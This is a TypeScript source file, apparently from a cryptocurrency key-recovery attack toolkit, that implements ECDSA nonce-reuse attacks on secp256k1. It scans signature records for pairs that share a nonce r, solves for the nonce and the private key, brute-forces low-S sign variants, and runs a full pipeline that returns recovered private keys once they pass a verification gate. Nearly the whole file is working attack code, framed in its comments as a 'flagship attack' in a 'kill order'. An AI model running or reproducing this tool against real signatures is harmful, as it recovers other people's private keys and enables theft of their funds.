/**
 * shared/keys/reuse.ts — Wave 1 flagship algebra attack (§8, kill order #2).
 * Runtime: inproc. Nonce reuse: same k on two messages ⇒
 *   k = (z1 - z2) / (s1 - s2) mod n ; d = (k*s1 - z1)/r mod n
 * R7: s may be low-S normalized ⇒ effective nonce is -k ⇒ brute-force the sign.
 * Never emits a key directly — candidates go through evidenceGate (§9).
 */
import { CURVE } from "./secp256k1";
import { invMod, mod } from "./secp256k1";

export interface SigPairRec {
  record_id: string;
  r: bigint;
  s: bigint;
  z: bigint;
}

/** Recover candidate private keys from two signatures sharing nonce r. */
export function reuseCandidates(a: SigPairRec, b: SigPairRec): bigint[] {
  if (a.r !== b.r) return []; // no reuse — nothing to do
  const n = CURVE.n;
  const dz = mod(a.z - b.z, n);
  const out: bigint[] = [];
  for (const sb of [b.s, mod(-b.s, n)]) {
    const ds = mod(a.s - sb, n);
    if (ds === 0n) continue;
    const k = mod(dz * invMod(ds, n), n);
    for (const sa of [a.s, mod(-a.s, n)]) {
      const d = mod((k * sa - a.z) * invMod(a.r, n), n);
      if (d >= 1n && d < n && !out.includes(d)) out.push(d);
    }
  }
  return out;
}

/** Scan a group's records for duplicate r values and yield all reuse pairs.
 *  W3 fix: same r across DIFFERENT pubkeys is not nonce reuse — k recovery
 *  requires the same d. Records carrying a pubkey are grouped by (pubkey, r);
 *  records without one (e.g. P2PKH spend from an unknown key) keep global r
 *  grouping and rely on the evidence gate to reject cross-key coincidences. */
export interface ReuseRec extends SigPairRec {
  pubkey?: string;
}

export function findReusePairs(records: ReuseRec[]): Array<[ReuseRec, ReuseRec]> {
  const byKey = new Map<string, ReuseRec[]>();
  for (const rec of records) {
    const key = rec.pubkey ? `${rec.pubkey.toLowerCase()}|${rec.r.toString(16)}` : `|${rec.r.toString(16)}`;
    const list = byKey.get(key);
    if (list) list.push(rec);
    else byKey.set(key, [rec]);
  }
  const pairs: Array<[ReuseRec, ReuseRec]> = [];
  for (const list of byKey.values()) {
    for (let i = 0; i < list.length; i++) {
      for (let j = i + 1; j < list.length; j++) {
        if (list[i].z !== list[j].z) pairs.push([list[i], list[j]]);
      }
    }
  }
  return pairs;
}

/**
 * W1.5 wiring: full pipeline in one call — pairs → candidates → gate (§9).
 * Never returns a key that did not pass d·G == Q and the second-impl check.
 */
export async function reuseAttack(
  records: ReuseRec[],
  gate: (dHex: string, qHex: string, expectedAddress?: string) => Promise<GateResultLike>,
): Promise<Array<{ pair: [string, string]; dHex: string; gate: GateResultLike }>> {
  const out: Array<{ pair: [string, string]; dHex: string; gate: GateResultLike }> = [];
  for (const [a, b] of findReusePairs(records)) {
    for (const d of reuseCandidates(a, b)) {
      const dHex = d.toString(16).padStart(64, "0");
      const qHex = a.pubkey ?? "";
      const g = await gate(dHex, qHex);
      out.push({ pair: [a.record_id, b.record_id], dHex, gate: g });
    }
  }
  return out;
}

export type GateResultLike = { ok: boolean; reason?: string };
